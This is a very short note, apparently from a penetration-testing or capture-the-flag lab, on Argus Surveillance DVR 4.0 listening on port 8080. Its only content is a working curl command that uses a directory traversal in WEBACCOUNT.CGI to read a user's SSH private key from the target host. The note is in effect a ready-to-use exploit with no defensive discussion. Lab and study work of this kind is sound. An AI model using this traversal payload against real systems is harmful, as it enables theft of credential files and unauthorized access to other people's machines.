# Argus Surveillance DVR 4.0 - 8080 port

## Directory Traversal / File Read

```bash
curl "http://192.168.226.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..\\Users\\viewer\\.ssh\\id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

[image]
